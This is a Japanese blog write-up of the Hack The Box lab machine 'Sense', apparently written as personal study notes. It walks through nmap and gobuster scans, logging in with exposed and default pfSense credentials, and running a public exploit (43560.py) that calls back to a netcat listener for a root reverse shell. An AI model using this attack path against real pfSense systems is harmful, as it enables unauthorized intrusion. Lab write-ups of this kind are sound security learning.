# はじめに
Hack The Boxの攻略などを自分用にまとめたものです。
主に記録用として記しています。
現在のランクはHackerです。
間違っていることも多いかと思いますが、よろしくお願いします。  
<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">  
チートシートも公開しておりますが知識がまだまだ不足しているため、学習経過とともに身につけた内容などを随時更新していきます。
GitHub(ペネトレーションテスト用チートシート):
https://github.com/yukitsukai47/PenetrationTesting_cheatsheet
Twitter:@yukitsukai1731

# Sense
![スクリーンショット 2020-07-29 17.27.12.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/1c9338dc-dadd-92b5-d7d3-48dace051a28.png)

HackTheBox公式より
Sense, while not requiring many steps to complete, can be challenging for some as the proof of concept exploit that is publicly available is very unreliable. An alternate method using the same vulnerability is required to successfully gain access.

Sense は、完了までに多くのステップを必要としませんが、一般に公開されている概念実証済みのエクスプロイトは非常に信頼性が低いため、一部の人にとっては難しいものとなる可能性があります。アクセスを成功させるためには、同じ脆弱性を利用した別の方法が必要です。

# スキャン
Sense(10.10.10.60)に対して、スキャンを行います。  
まずnmapからスキャンを開始します。
## nmap 

```
nmap -sC -sV -oN sense.nmap 10.10.10.60
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -oN...通常出力

```
# Nmap 7.80 scan initiated Tue Jul 28 04:01:20 2020 as: nmap -sC -sV -oN sense.nmap 10.10.10.60
Nmap scan report for 10.10.10.60
Host is up (0.26s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE    VERSION
80/tcp  open  http       lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 28 04:03:20 2020 -- 1 IP address (1 host up) scanned in 120.06 seconds
```

この結果から、80，443番ポートにおいてhttpdが動いていることが分かります。
![スクリーンショット 2020-07-29 17.37.23.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/d3c2af5c-43cb-504b-bbf6-1f94dd961927.png)
特に他に得られる情報がないので、gobusterを使ってディレクトリをスキャンします。

## gobuster
```
kali@kali:~/htb/Sense$ gobuster dir -t 25 -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -o sense.gobuster -k
```

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.60
[+] Threads:        25
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2020/07/28 04:08:28 Starting gobuster
===============================================================
/index.php (Status: 200)
/help.php (Status: 200)
/themes (Status: 301)
/stats.php (Status: 200)
/css (Status: 301)
/edit.php (Status: 200)
/includes (Status: 301)
/license.php (Status: 200)
/system.php (Status: 200)
/status.php (Status: 200)
/javascript (Status: 301)
/changelog.txt (Status: 200)
/classes (Status: 301)
/exec.php (Status: 200)
/widgets (Status: 301)
/graph.php (Status: 200)
/tree (Status: 301)
/wizard.php (Status: 200)
/shortcuts (Status: 301)
/pkg.php (Status: 200)
/installer (Status: 301)
/wizards (Status: 301)
/xmlrpc.php (Status: 200)
/reboot.php (Status: 200)
/interfaces.php (Status: 200)
/csrf (Status: 301)
/system-users.txt (Status: 200)
/filebrowser (Status: 301)
/%7Echeckout%7E (Status: 403)
===============================================================
2020/07/28 06:13:08 Finished
===============================================================
```

様々なものを検出することができました。  
ここから手掛かりになりそうなものを集めていきましょう。  
まずは、/changelog.txtです。changelog.txtの内容を確認すると、脆弱性が残っていることが記載されていることが分かります。
![スクリーンショット 2020-07-29 16.50.54.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/d273ee5c-d0bc-3e71-16ab-6c5f5b67c677.png)
![スクリーンショット 2020-07-29 16.51.05.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/9cd13d25-2467-a575-dac6-52c876e8178c.png)

次に、system-users.txtです。
これを見ると、先ほどのログイン画面で使えそうな認証情報が書かれています。
![スクリーンショット 2020-07-29 16.53.55.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/d7a9cc9d-643f-c06b-a792-11b5acdf84d6.png)
このpasswordのcompany defaultsというのはsenseのデフォルトパスワードのことだと推測し、Senseについて検索を行います。
![スクリーンショット 2020-07-29 17.39.49.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/5cc5eb0f-5716-45df-0302-a1f2db789cd8.png)
この情報を使うとログイン可能になります。
注意点として先ほど見つけた認証情報のusernameであるRohitをrohitと入力しなければログインすることができません。

ログインするとこのようになります。
![スクリーンショット 2020-07-29 17.42.12.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/b6de8c7f-3ce9-1e3a-95d0-0251d82c4ce8.png)
この情報からpfsenseのバージョンが2.1.3であることが分かります。


# 侵入
searchsploitを使って、pfsense 2.1.3について調べると以下の脆弱性情報が見つかります。
今回このコードを使用してきましょう。
![スクリーンショット 2020-07-29 17.03.41.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/e95ef333-c3d9-77a7-1cf8-f5f861a70822.png)
コードを確認すると、
rhost,lhost,lport,username,passwordが必要なようです。  
全て指定して、netcatをリッスンさせてからエクスプロイトを実行します。

```
kali@kali:~/htb/Sense$ mv 43560.py pfsense_exploit.py
kali@kali:~/htb/Sense$ python3 pfsense_exploit.py --rhost 10.10.10.60 --lhost 10.10.14.9 --lport 4444 --username rohit --password pfsense
```
![スクリーンショット 2020-07-29 17.20.16.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/45076019-937e-372b-7b0b-ea29dbaf7df9.png)
root権限を取得しました。
お疲れ様でした。